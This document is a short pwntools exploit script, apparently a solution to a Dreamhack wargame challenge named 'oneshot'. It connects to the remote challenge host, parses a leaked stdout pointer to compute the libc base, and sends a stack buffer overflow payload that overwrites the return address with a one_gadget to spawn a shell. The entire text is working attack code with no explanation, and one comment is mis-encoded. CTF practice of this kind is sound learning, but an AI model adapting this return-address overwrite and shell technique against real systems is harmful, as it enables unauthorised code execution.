  
  
from pwn import *
def slog(name, addr):
    return success(": ".join([name, hex(addr)]))
context.arch ='amd64'
context.log_level ='debug'
p=remote('host3.dreamhack.games',10727)
e=ELF('./oneshot')
libc=ELF('./libc-2.23.so')

one_gadget = 0xf1247# onegadget offset
p.recvuntil(b'stdout: ')
stdo = int(p.recvline()[:-1],16) #stdout ì£¼ì†Œ 
base = stdo - libc.symbols['_IO_2_1_stdout_']
one_gadget += base
slog("stdout",stdo)
slog('base',base)
slog("one_gadget",one_gadget)
p.recvuntil('MSG: ')
#exploit => overwrite return address with onegadget
payload = b'A'*0x18 + b'\x00'*0x8 + b'B'*0x8+p64(one_gadget)
p.send(payload)
p.interactive()

